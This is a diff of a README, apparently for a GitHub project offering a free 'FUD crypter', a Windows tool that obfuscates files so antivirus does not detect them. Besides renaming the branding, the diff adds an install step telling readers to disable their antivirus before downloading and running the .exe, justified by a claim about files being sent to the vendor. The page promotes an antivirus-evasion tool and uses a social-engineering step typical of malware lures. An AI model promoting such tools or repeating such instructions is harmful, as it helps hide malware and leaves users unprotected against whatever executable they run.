@@ -5,7 +5,7 @@
 <br>
 <br>
 The only <strong>FREE</strong> and 100% FUD crypter that <strong>WILL STILL FUD</strong>, work on Windows. Powerfull obfuscator to bypass Anti-Viruses detection.
-<div class="center" align="center"><center><img src="LOGOURL" width="120" alt="orionx fud crypter skull logo"/></center></div>
+<div class="center" align="center"><center><img src="LOGOURL" width="120" alt="ghost fud crypter logo"/></center></div>
 <br>
 <div align="center" class="center">
 <center><strong>GHOST FUD CRYPTER <br> <a href=""> DOWNLOAD </a></font></strong></center>
@@ -26,6 +26,7 @@ It was actually made for windows but I will release the source code and modify i
 
 Usage/Install
 -----
+- Before downloading you will need to disable your Anti-Virus, otherwise it sends your crypted file to the Anti-Virus company
 - Click <a href="https://github.com/hackerOrionX/ORIONX-FUD-CRYPTER/archive/refs/heads/main.zip">HERE</a> to download
 - EXTRACT before using otherwise the script will not work correctly
 - Run the .exe 
